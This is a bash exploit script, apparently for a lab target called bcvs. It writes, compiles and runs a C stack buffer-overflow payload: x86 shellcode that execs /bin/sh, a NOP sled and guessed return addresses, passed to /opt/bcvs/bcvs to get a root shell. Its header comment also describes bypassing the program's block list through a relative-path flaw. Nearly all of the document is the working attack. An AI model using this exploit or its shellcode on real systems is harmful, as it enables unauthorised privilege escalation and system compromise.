#!/bin/bash

## -------------------- Description -------------------- ##
# The bcvs program uses a relative path to check its
# "block.list". Therefore you can simply execute bcvs
# from a directory other than its usual but with the
# same directory layout and you can get around the blocks
#
# Right now this sploit is not complete but being able to
# bypass the block check is a start.
#
# Right now I am working on exploiting the strcpy/strcat
# overflow in the copyFile function.
## ----------------------------------------------------- ##

cat <<EOS > "exploit.c"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BSIZE 256
#define NOP 0x90

// Shellcode for exec of /bin/sh
char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
  __asm__("movl %esp, %eax");
}

void main(int argc, char* argv[]) {
  char buff[DEFAULT_BSIZE];
  char *ptr;
  long *long_ptr, addr;
  int i = 0;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BSIZE;

  if (argc > 1) offset = atoi(argv[1]);

  //printf("Offset is: %d\n", offset);
  //printf("Stack Pointer is: 0x%x\n", get_sp()); 
  addr = get_sp() - offset;
  //printf("Using address: 0x%x\n", addr);

  ptr = buff;
  // Shifting by 3 align the addresses with the word boundary when
  // smashing the stack
  long_ptr = (long *) (ptr + 3);
  //First we fill the buffer with our best guess of the address for
  //the buffer in the attacked program
  for (i = 0; long_ptr < (buff+bsize-3); i += 4) {
    *(long_ptr++) = addr;
  }

  // Setup the nop sled
  for (i = 0; i < (bsize/2); ++i)
    buff[i] = NOP;

  // Insert our shellcode
  ptr = buff + (bsize/2);
  for (i = 0; i < strlen(shellcode); ++i) {
    *(ptr++) = shellcode[i];
  }
  buff[bsize-1] = '\0';
  printf(buff);
  return;
}
EOS
gcc -o exploit exploit.c

SHELL_CODE=$(./exploit)
#echo "$SHELL_CODE"

OFFSET=425
echo "Trying offset: $OFFSET"
SHELL_CODE=$(./exploit $OFFSET)
/opt/bcvs/bcvs ci "${SHELL_CODE}"

# And then hopefully you have a root shell at this point
